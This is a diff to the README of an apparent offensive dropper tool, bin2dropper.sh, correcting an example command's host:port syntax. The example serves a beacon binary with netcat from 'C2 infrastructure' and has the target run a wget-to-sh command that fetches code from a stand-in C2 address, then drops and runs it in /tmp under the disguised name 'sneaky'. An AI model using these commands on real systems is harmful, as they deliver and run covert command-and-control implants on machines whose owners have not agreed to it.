@@ -87,7 +87,7 @@ target are openssl and gunzip.
 Example:
 ```sh
 ./bin2dropper.sh -d sneaky ./ncbeacon | nc -Nnvl 8080 # On C2 infrastructure
-cd /tmp; wget -qO- C2_ADDR 8080 | sh                  # On target
+cd /tmp; wget -qO- C2_ADDR:8080 | sh                  # On target
 ```
 This will use wget to grab a script which drops `./ncbeacon` to `/tmp/sneaky`
 and runs it as `sneaky`.
